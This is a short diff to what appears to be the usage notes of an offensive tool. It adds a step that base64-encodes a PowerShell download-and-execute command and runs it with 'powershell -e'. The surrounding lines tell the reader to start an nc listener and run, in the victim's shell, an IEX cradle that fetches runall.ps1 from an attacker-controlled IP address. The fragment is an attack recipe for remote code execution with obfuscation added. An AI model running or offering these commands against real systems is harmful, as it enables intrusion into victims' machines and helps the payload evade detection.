@@ -12,6 +12,11 @@ Start nc listener
 
 In victim's cmd shell
     powershell -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.61.128/runall.ps1')
+
+OR encoded powershell command
+    IEX (New-Object Net.WebClient).DownloadString('http://192.168.61.128/runall.ps1') save to to_encode.txt 
+    python b64_encode.py to_encode.txt 
+    powershell -e <b64 payload>
 ```
 
 ## Source
